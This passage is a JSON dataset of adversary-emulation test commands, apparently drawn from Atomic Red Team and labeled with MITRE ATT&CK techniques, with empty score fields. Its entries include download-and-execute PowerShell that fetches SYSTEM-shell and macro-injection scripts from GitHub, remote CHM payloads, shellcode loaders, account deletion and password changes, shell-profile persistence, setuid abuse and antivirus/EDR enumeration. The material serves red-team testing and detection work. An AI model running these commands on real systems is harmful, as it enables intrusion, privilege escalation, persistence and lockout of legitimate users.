        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\"\n",
        "Description": "This module executes notepad.exe from within the WINWORD.EXE process\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.012",
        "Shell": "powershell"
    },
    {
        "ID": 280,
        "Command": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcess.exe -program \"C:\\Windows\\System32\\werfault.exe\" -debug\n",
        "Description": "Creates a process in a suspended state, executes shellcode to spawn calc.exe in a child process, and then resumes the original process.\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocess)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.012",
        "Shell": "powershell"
    },
    {
        "ID": 281,
        "Command": "$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -program \"C:\\Windows\\System32\\werfault.exe\" -debug\n",
        "Description": "Create a process in a suspended state, execute shellcode to spawn calc.exe in a child process, and then resume the original process.\nThis test uses the CreatePipe function to create an anonymous pipe that parent and child processes can communicate over. This anonymous pipe\nallows for the retrieval of output generated from executed shellcode.\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.012",
        "Shell": "powershell"
    },
    {
        "ID": 282,
        "Command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"%tmp%\\T1106.exe\" /target:exe \"PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs\"\n%tmp%/T1106.exe\n",
        "Description": "Execute program by leveraging Win32 API's. By default, this will launch calc.exe from the command prompt.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1106",
        "Shell": "command_prompt"
    },
    {
        "ID": 283,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')",
        "Description": "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1106",
        "Shell": "powershell"
    },
    {
        "ID": 284,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')",
        "Description": "Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1106",
        "Shell": "powershell"
    },
    {
        "ID": 285,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')",
        "Description": "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1106",
        "Shell": "powershell"
    },
    {
        "ID": 286,
        "Command": "$PathToAtomicsFolder\\T1106\\bin\\x64\\syscall.exe -debug\n",
        "Description": "Runs shellcode in the current running process via a syscall.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Use syscall to execute the entrypoint of the shellcode\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#syscall)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1106",
        "Shell": "powershell"
    },
    {
        "ID": 287,
        "Command": "& \"PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat\"\n",
        "Description": "Psiphon 3 is a circumvention tool from Psiphon Inc. that utilizes VPN, SSH and HTTP Proxy technology to provide you\nwith uncensored access to Internet.\nThis process will launch Psiphon 3 and establish a connection. Shortly after it will be shut down via process kill commands.\nMore information can be found about Psiphon using the following urls\nhttp://s3.amazonaws.com/0ubz-2q11-gi9y/en.html\nhttps://psiphon.ca/faq.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1090.003",
        "Shell": "powershell"
    },
    {
        "ID": 288,
        "Command": "invoke-expression 'cmd /c start powershell -Command {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\tor\\Tor\\tor.exe\"}'\nsleep -s 60\nstop-process -name \"tor\" | out-null\n",
        "Description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1090.003",
        "Shell": "powershell"
    },
    {
        "ID": 289,
        "Command": "[ \"$(uname)\" = 'FreeBSD' ] && sysrc tor_enable=\"YES\" && service tor start || sudo systemctl start tor\n",
        "Description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1090.003",
        "Shell": "sh"
    },
    {
        "ID": 290,
        "Command": "osascript -e 'tell application \"Terminal\" to do script \"tor\"'\n",
        "Description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1090.003",
        "Shell": "sh"
    },
    {
        "ID": 291,
        "Command": "pnputil.exe /add-driver \"C:\\Windows\\INF\\usbstor.inf\"\n",
        "Description": "Install a driver via pnputil.exe lolbin\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547",
        "Shell": "command_prompt"
    },
    {
        "ID": 292,
        "Command": "pnputil.exe -i -a C:\\Windows\\INF\\acpipmi.inf\n",
        "Description": "pnputil.exe is a native command-line utility in Windows to install drivers, this can be abused by to install malicious drivers. Ref: https://lolbas-project.github.io/lolbas/Binaries/Pnputil/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547",
        "Shell": "powershell"
    },
    {
        "ID": 293,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\\Addins\\Malware\" /v Name /t REG_SZ /d \"C:\\Windows\\System32\\amsi.dll\" /f\n",
        "Description": "Virtual Channels can be leveraged to alter RDP behavior using dedicated Addins.The mechanism is implemented using DLLs which can be executed during RDP session automatically. \nThe DLLs are loaded in the host system only after successful connection is established with the remote system.\nOnce the test is run, amsi.dll will be loaded on the host system during successful RDP session.\nBlog :https://learn.microsoft.com/en-us/windows/win32/termserv/terminal-services-virtual-channels?redirectedfrom=MSDN\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547",
        "Shell": "command_prompt"
    },
    {
        "ID": 294,
        "Command": "sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -allUsers -privs -all -quiet\n",
        "Description": "ARD leverages a blend of protocols, including VNC to send the screen and control buffers and SSH for secure file transfer. \nAdversaries can abuse ARD to gain remote code execution and perform lateral movement.\n\nReferences:  https://www.mandiant.com/resources/blog/leveraging-apple-remote-desktop-for-good-and-evil\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.005",
        "Shell": "sh"
    },
    {
        "ID": 295,
        "Command": "& \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html\"\n",
        "Description": "The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) without user interaction. \nThe HTML file is based off of the work from [Stan Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.006",
        "Shell": "powershell"
    },
    {
        "ID": 296,
        "Command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"\nPowershell -noprofile\n",
        "Description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.008",
        "Shell": "powershell"
    },
    {
        "ID": 297,
        "Command": "if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo \"$ssh_authorized_keys\" > ~/.ssh/authorized_keys; fi;\n",
        "Description": "Modify contents of <user-home>/.ssh/authorized_keys to maintain persistence on victim host. \nIf the user is able to save the same contents in the authorized_keys file, it shows user can modify the file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098.004",
        "Shell": "sh"
    },
    {
        "ID": 298,
        "Command": "net user AtomicAdministrator User2ChangePW! /add\nnet.exe user AtomicAdministrator HuHuHUHoHo283283@dJD\n",
        "Description": "Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account \"AtomicAdministrator\" with\nthe password \"HuHuHUHoHo283283\".\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1531",
        "Shell": "command_prompt"
    },
    {
        "ID": 299,
        "Command": "net user AtomicUser User2DeletePW! /add\nnet.exe user AtomicUser /delete\n",
        "Description": "Deletes a user account to prevent access. Upon execution, run the command \"net user\" to verify that the new \"AtomicUser\" account was deleted.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1531",
        "Shell": "command_prompt"
    },
    {
        "ID": 300,
        "Command": "$PWord = ConvertTo-SecureString -String password -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList domain\\super_user, $PWord\nif((Get-ADUser remove_user -Properties memberof).memberof -like \"CN=Domain Admins*\"){\n  Remove-ADGroupMember -Identity \"Domain Admins\" -Members remove_user -Credential $Credential -Confirm:$False\n} else{\n\\twrite-host \"Error - Make sure remove_user is in the domain admins group\" -foregroundcolor Red\n}\n",
        "Description": "This test will remove an account from the domain admins group\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1531",
        "Shell": "powershell"
    },
    {
        "ID": 301,
        "Command": "passwd ARTUser #enter admin password > enter new password > confirm new password\n",
        "Description": "This test changes the user password to hinder access to the account using passwd utility.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1531",
        "Shell": "sh"
    },
    {
        "ID": 302,
        "Command": "dscl . -delete /Users/ARTUser #enter admin password\n",
        "Description": "This test deletes the user account using the dscl utility.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1531",
        "Shell": "sh"
    },
    {
        "ID": 303,
        "Command": "sysadminctl -deleteUser ARTUserAccount #enter admin password\n",
        "Description": "This test deletes the user account using the sysadminctl utility.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1531",
        "Shell": "sh"
    },
    {
        "ID": 304,
        "Command": "Connect-AzureAD\n$userprincipalname = \"atomicredteam@yourdomain.com\"\nRemove-AzureADUser -ObjectId $userprincipalname",
        "Description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1531",
        "Shell": "powershell"
    },
    {
        "ID": 305,
        "Command": "az login\n$userprincipalname = \"atomicredteam@yourdomain.com\"\naz ad user delete --id $userprincipalname",
        "Description": "Deletes a user in Azure AD. Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (excluding changed credentials) to remove access to accounts.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1531",
        "Shell": "powershell"
    },
    {
        "ID": 306,
        "Command": "hh.exe \"PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm\"\n",
        "Description": "Uses hh.exe to execute a local compiled HTML Help payload.\nUpon execution calc.exe will open\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 307,
        "Command": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm\n",
        "Description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 308,
        "Command": "Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
        "Description": "Executes a CHM file with the default Shortcut Command method.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.001",
        "Shell": "powershell"
    },
    {
        "ID": 309,
        "Command": "Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
        "Description": "Executes a CHM file with the ITS protocol handler.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.001",
        "Shell": "powershell"
    },
    {
        "ID": 310,
        "Command": "Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm",
        "Description": "Executes a CHM file simulating a user double click.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.001",
        "Shell": "powershell"
    },
    {
        "ID": 311,
        "Command": "Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
        "Description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.001",
        "Shell": "powershell"
    },
    {
        "ID": 312,
        "Command": "Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm",
        "Description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.001",
        "Shell": "powershell"
    },
    {
        "ID": 313,
        "Command": "hh.exe -decompile %temp% \"PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm\"\n",
        "Description": "Uses hh.exe to decompile a local compiled HTML Help file.\nUpon successful execution the chm file will decompile to disk.\nReference:https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 314,
        "Command": "Test-NetConnection -ComputerName google.com -port 8081\n",
        "Description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1571",
        "Shell": "powershell"
    },
    {
        "ID": 315,
        "Command": "echo quit | telnet google.com 8081\nexit 0\n",
        "Description": "Testing uncommonly used port utilizing telnet.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1571",
        "Shell": "sh"
    },
    {
        "ID": 316,
        "Command": "$RemovableDrives=@()\n$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter \"drivetype=2\" | select-object -expandproperty DeviceID\nForEach ($Drive in $RemovableDrives)\n{\nwrite-host \"Removable Drive Found:\" $Drive\nNew-Item -Path $Drive/T1091Test1.txt -ItemType \"file\" -Force -Value \"T1091 Test 1 has created this file to simulate malware spread to removable drives.\"\n}\n",
        "Description": "Simulates an adversary copying malware to all connected removable drives. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1091",
        "Shell": "powershell"
    },
    {
        "ID": 317,
        "Command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bash_profile\n",
        "Description": "Adds a command to the .bash_profile file of the current user\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.004",
        "Shell": "sh"
    },
    {
        "ID": 318,
        "Command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bashrc\n",
        "Description": "Adds a command to the .bashrc file of the current user\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.004",
        "Shell": "sh"
    },
    {
        "ID": 319,
        "Command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.shrc\n",
        "Description": "Adds a command to the .shrc file of the current user\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.004",
        "Shell": "sh"
    },
    {
        "ID": 320,
        "Command": "echo '# Hello from Atomic Red Team T1546.004' >> /etc/profile\n",
        "Description": "An adversary may wish to establish persistence by executing malicious commands from the systems /etc/profile every time \"any\" user logs in.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.004",
        "Shell": "sh"
    },
    {
        "ID": 321,
        "Command": "echo '# Atomic Red Team was here... T1546.004' >> ~/.profile\n",
        "Description": "An adversary may wish to establish persistence by executing malicious commands from the users ~/.profile every time the \"user\" logs in.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.004",
        "Shell": "sh"
    },
    {
        "ID": 322,
        "Command": "echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh\n",
        "Description": "An adversary may wish to establish persistence by adding commands into any of the script files in the /etc/profile.d/ directory, which are executed every time \"any\" user logs in.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.004",
        "Shell": "sh"
    },
    {
        "ID": 323,
        "Command": "useradd --create-home --shell /bin/bash art\nsu -l art -c \"echo 'echo \\\"Atomic Red Team was here... T1546.004\\\" >> /home/art/art.txt' >> /home/art/.bash_logout; exit\"\n",
        "Description": "The Bash shell runs ~/.bash_logout \"if it exists\" to run commands on user logout. An adversary may create or append to a .bash_logout to clear history, start processes etc. Note the ~/.bash_logout is only run if you explicitly exit or log out of an \"interactive login shell session\" i.e. via the console, SSH, /bin/bash -l or su -l <username>. \n\nThis test creates the art user, logs in, creates a .bash_logout which will echo some text into the art.txt file on logout and logs out and the /home/art/art.txt is created.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.004",
        "Shell": "bash"
    },
    {
        "ID": 324,
        "Command": "cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n",
        "Description": "Make, change owner, and change file attributes on a C source code file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.001",
        "Shell": "sh"
    },
    {
        "ID": 325,
        "Command": "cp PathToAtomicsFolder/T1548.001/src/hello.c /tmp/hello.c\nchown root /tmp/hello.c\nmake /tmp/hello\nchown root /tmp/hello\nchmod u+s /tmp/hello\n/tmp/hello\n",
        "Description": "Make, change owner, and change file attributes on a C source code file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.001",
        "Shell": "sh"
    },
    {
        "ID": 326,
        "Command": "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod u+xs /tmp/evilBinary\n",
        "Description": "This test sets the SetUID flag on a file in FreeBSD.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.001",
        "Shell": "sh"
    },
    {
        "ID": 327,
        "Command": "touch /tmp/evilBinary\nchown root /tmp/evilBinary\nchmod u+xs /tmp/evilBinary\n",
        "Description": "This test sets the SetUID flag on a file in FreeBSD.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.001",
        "Shell": "sh"
    },
    {
        "ID": 328,
        "Command": "sudo touch /tmp/evilBinary\nsudo chown root /tmp/evilBinary\nsudo chmod g+xs /tmp/evilBinary\n",
        "Description": "This test sets the SetGID flag on a file in Linux and macOS.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.001",
        "Shell": "sh"
    },
    {
        "ID": 329,
        "Command": "touch /tmp/evilBinary\nchown root /tmp/evilBinary\nchmod g+xs /tmp/evilBinary\n",
        "Description": "This test sets the SetGID flag on a file in FreeBSD.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.001",
        "Shell": "sh"
    },
    {
        "ID": 330,
        "Command": "cp PathToAtomicsFolder/T1548.001/src/cap.c /tmp/cap.c\nmake /tmp/cap\nsudo setcap cap_setuid=ep /tmp/cap\n/tmp/cap\n",
        "Description": "Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.\nThe binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.\nWithout being owned by root, the binary can set the UID to 0.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.001",
        "Shell": "sh"
    },
    {
        "ID": 331,
        "Command": "touch /tmp/evilBinary\nsudo setcap cap_setuid=ep /tmp/evilBinary\n",
        "Description": "This test gives a file the capability to set UID without using flags.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.001",
        "Shell": "sh"
    },
    {
        "ID": 332,
        "Command": "find /usr/bin -perm -4000\n",
        "Description": "This test simulates a command that can be run to enumerate files that have the setuid bit set\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.001",
        "Shell": "sh"
    },
    {
        "ID": 333,
        "Command": "find /usr/bin -perm -2000\n",
        "Description": "This test simulates a command that can be run to enumerate files that have the setgid bit set\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.001",
        "Shell": "sh"
    },
    {
        "ID": 334,
        "Command": "netsh.exe advfirewall  show allprofiles \nnetsh.exe advfirewall firewall dump\nnetsh.exe advfirewall show currentprofile\nnetsh.exe advfirewall firewall show rule name=all\nnetsh.exe firewall show state\nnetsh.exe firewall show config\nsc query windefend\npowershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\"\npowershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\"\npowershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\"\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\ntasklist.exe | findstr /i mc\ntasklist.exe | findstr /i \"virus cb defender cylance mc\"\n",
        "Description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 335,
        "Command": "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\nget-process | ?{$_.Description -like \"*mc*\"}\nget-process | ?{$_.ProcessName -like \"*mc*\"}\nget-process | Where-Object { $_.ProcessName -eq \"Sysmon\" }\n",
        "Description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\nNote that, depending on the privilege of current user, get-process | ?{$_.Description -like \"*\"} may not return the processes related to AV products of the check.\nFor instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like \"*\"},\nif you know the name of those processes.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "powershell"
    },
    {
        "ID": 336,
        "Command": "ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'\n",
        "Description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "sh"
    },
    {
        "ID": 337,
        "Command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'\n",
        "Description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "sh"
    },
    {
        "ID": 338,
        "Command": "pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'\n",
        "Description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell is going to display AV/Security software it is running.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "sh"
    },
    {
        "ID": 339,
        "Command": "fltmc.exe | findstr.exe 385201\n",
        "Description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 340,
        "Command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List",
        "Description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 341,
        "Command": "powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct\npowershell Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct\n",
        "Description": "Discovery of installed antivirus products via Get-CimInstance and Get-WmiObject cmdlets of powershell.\n\nwhen sucessfully executed, information about installed AV software is displayed..\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 342,
        "Command": "Get-Service WinDefend #check the service state of Windows Defender\nGet-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc\nGet-MpThreat #threats details that have been detected using MS Defender\n",
        "Description": "Windows Defender Enumeration via different built-in windows native tools.\nwhen sucessfully executed, information about windows defender is displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "powershell"
    },
    {
        "ID": 343,
        "Command": "Get-NetFirewallProfile | Format-Table Name, Enabled\nGet-NetFirewallSetting\nGet-NetFirewallRule | select DisplayName, Enabled, Description\n",
        "Description": "Enumerates windows firewall to retrieves firewall rules from the target computer.\n\nwhen sucessfully executed, details of windows firewall is displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "powershell"
    },
    {
        "ID": 344,
        "Command": "wmic /Node:localhost /Namespace:\\\\root\\Microsoft\\Windows\\Defender Path MSFT_MpPreference Get /format:list | findstr /i /C:\"DisableRealtimeMonitoring\" /C:\"ExclusionPath\" /C:\"ExclusionExtension\" /C:\"ExclusionProcess\"\n",
        "Description": "In this test, a WMIC command is used to probe the local Windows system for the configuration of Windows Defender's exclusions. This command targets the MSFT_MpPreference \nclass within the Windows Management Instrumentation (WMI) namespace, allowing the retrieval of critical settings such as disabled real-time monitoring and specified \nexclusion paths, file extensions, and processes. Attackers might use this approach to understand what is excluded from antivirus scans, enabling further exploitation.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 345,
        "Command": "tasklist.exe\nsc query\nsc query state= all\n",
        "Description": "Identify system services.\n\nUpon successful execution, cmd.exe will execute service commands with expected result to stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1007",
        "Shell": "command_prompt"
    },
    {
        "ID": 346,
        "Command": "net.exe start >> %temp%\\service-list.txt\n",
        "Description": "Enumerates started system services using net.exe and writes them to a file. This technique has been used by multiple threat actors.\n\nUpon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in in the temp directory called service-list.txt.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1007",
        "Shell": "command_prompt"
    },
    {
        "ID": 347,
        "Command": "if [ \"$(uname)\" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;\n",
        "Description": "Enumerates system service using systemctl/service\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1007",
        "Shell": "bash"
    },
    {
